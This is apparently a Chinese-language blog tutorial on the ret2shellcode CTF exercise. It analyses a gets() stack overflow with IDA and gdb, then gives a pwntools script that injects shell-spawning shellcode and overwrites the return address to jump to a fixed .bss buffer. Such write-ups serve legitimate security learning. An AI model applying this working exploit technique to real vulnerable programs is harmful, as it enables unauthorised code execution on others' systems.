---
layout:     post
title:      pwn学习（二）：栈溢出注入shellcode
subtitle:   利用栈溢出获取控制权
date:       2021-05-26
author:     Hongtai S
header-img: img/6.jpg
catalog: true
tags:
    - 漏洞
    - 二进制
    - 栈溢出
    - pwn
    - shellcode
---
# 栈溢出注入shellcode#

## ret2shellcode题目分析 ##

将文件ret2shellcode拖入Ida中查看还原的C代码：

![1.PNG](https://i.loli.net/2021/08/08/i3YNMK2IVwse6l9.png)

发现不安全的gets()函数,能够利用栈溢出覆盖返回地址以获取一次劫持程序执行流的机会。

程序中没有能够进入shell的函数，但是构造了一个环境变量buf2，存放在bbs区。检查程序有没有开PIE，说明每次运行bbs区都不会改变地址。

![2.PNG](https://i.loli.net/2021/08/08/JRdMm8bkKG2wLFa.png)

因此可以利用这个缓冲区承载shellcode并执行，而strncpy函数刚好可以将gets接受的内存复制到缓冲区，覆盖的跳转地址即为buf2的基址。利用Ida查看buf2的基址是0x0804A080：

![3.PNG](https://i.loli.net/2021/08/08/5DKWZgBxSlCLeTR.png)

gdb动态调试验证：

到gets()函数，输入字符串AAAA后查看栈中情况：

![4.PNG](https://i.loli.net/2021/08/08/cdMVUWjxl9n7wFR.png)

可以看到栈中字符串的首地址为0xffffd12c，ebp的首地址为0xffffd198，他们之间的距离为0xffffd12c-0xffffd198 = 108，算上ebp需要填充的字符为b'A' * 108 + 'B' * 4，左后在加上跳转的地址即可改变程序的执行流。但是此时发现程序无处可跳转，因为没有获取shell的命令，因此利用buf2写入获取shell的命令，跳转到buf2的基址即可，而填充栈的字符中刚好可以将shellcode写入栈，因此填充字符的前半部分改为获取shell的shellcode，然后填充至112字符即可。

![5.PNG](https://i.loli.net/2021/08/08/9KksiCUj2ZJXmHY.png)

## 编写脚本 ##

 ```python
from pwn import *

#远程连接服务器使用remote函数
#io = remote("ip", port)

#使用本地进程测试使用process函数
io = process("ret2shellcode")

#接受程序的一行打印
io.recvline()

#获取能够获得shell的二进制代码
shellcode = asm(shellcraft.sh())

#构造payload,用ljust函数帮助填充shellcode至112个字符大小
payload = shellcode.ljust(112, b'A') + p32(0x0804A080)

#发送构造的数据
io.sendline(payload)

#获取shell交互
io.interactive()

```

运行脚本成功获取shell权限
![6.PNG](https://i.loli.net/2021/08/08/xOerPU2sqiYw1nD.png)



